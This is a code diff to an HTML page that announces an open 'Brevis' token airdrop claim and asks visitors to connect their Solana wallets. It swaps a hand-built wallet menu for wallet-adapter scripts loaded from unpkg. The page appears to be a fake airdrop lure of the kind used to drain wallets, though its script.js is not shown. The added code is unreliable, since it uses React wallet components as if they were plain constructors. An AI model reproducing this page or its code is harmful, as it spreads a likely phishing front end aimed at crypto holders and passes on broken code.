@@ -4110,11 +4110,7 @@
                                 <div></div>
                                 <div class="ComingSoon_comingSoonText2__qK5sV">The airdrop claim for new Brevis users is now open. Get your tokens now!</div>
                                 <button id="connectBtn" class="gradient-btn bst-butn-prime">Connect Wallet</button>
-                                <div id="wallet-menu" style="display:none; margin-top:20px;">
-                                <button class="wallet-btn" data-wallet="phantom">Phantom</button>
-                                <button class="wallet-btn" data-wallet="solflare">Solflare</button>
-                                <button class="wallet-btn" data-wallet="coinbase">Coinbase Wallet</button>
-                                </div>
+                                <div id="wallet-button"></div>
                             </div>
                         </div>
                     </div>
@@ -4135,57 +4131,39 @@
     </div>
 
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/wallet-adapter-base@latest/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/wallet-adapter-wallets@latest/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/wallet-adapter-ui@latest/lib/index.iife.min.js"></script>
 <script src="script.js"></script>
 <script>
-  const connectBtn = document.getElementById("connect-wallet");
-  const walletMenu = document.getElementById("wallet-menu");
+  const { Connection, clusterApiUrl } = solanaWeb3;
+  const network = solanaWeb3.clusterApiUrl("mainnet-beta");
 
-  connectBtn.addEventListener("click", () => {
-    walletMenu.style.display = "block";
+  const connection = new Connection(network);
+
+  const wallets = [
+    new solanaWalletAdapterWallets.PhantomWalletAdapter(),
+    new solanaWalletAdapterWallets.SolflareWalletAdapter(),
+    new solanaWalletAdapterWallets.BackpackWalletAdapter(),
+    new solanaWalletAdapterWallets.WalletConnectWalletAdapter({
+      network: "mainnet-beta",
+      options: {
+        projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
+      },
+    }),
+  ];
+
+  const walletProvider = new solanaWalletAdapterBase.WalletProvider({
+    wallets,
+    autoConnect: false,
   });
 
-  walletMenu.addEventListener("click", async (event) => {
-    const walletName = event.target.dataset.wallet;
-    if (!walletName) return;
-
-    try {
-      // PHANTOM
-      if (walletName === "phantom") {
-        if (window.solana?.isPhantom) {
-          const resp = await window.solana.connect();
-          alert("Connected Phantom: " + resp.publicKey.toString());
-        } else {
-          window.location.href = "https://phantom.app/download";
-        }
-      }
-
-      // SOLFLARE
-      if (walletName === "solflare") {
-        if (window.solflare?.isSolflare) {
-          const resp = await window.solflare.connect();
-          alert("Connected Solflare");
-        } else {
-          window.location.href = "https://solflare.com/download";
-        }
-      }
-
-      // COINBASE WALLET (Solana)
-      if (walletName === "coinbase") {
-        if (window.coinbaseSolana) {
-          const resp = await window.coinbaseSolana.connect();
-          alert("Connected Coinbase Wallet");
-        } else {
-          window.location.href = "https://www.coinbase.com/wallet/downloads";
-        }
-      }
-
-      walletMenu.style.display = "none";
-
-    } catch (err) {
-      console.error(err);
-      alert("Connection failed");
-    }
+  const walletModal = new solanaWalletAdapterUi.WalletModalProvider({
+    container: document.getElementById("wallet-button"),
+    walletProvider,
   });
+
+  walletModal.render();
 </script>
 
 </body></html>
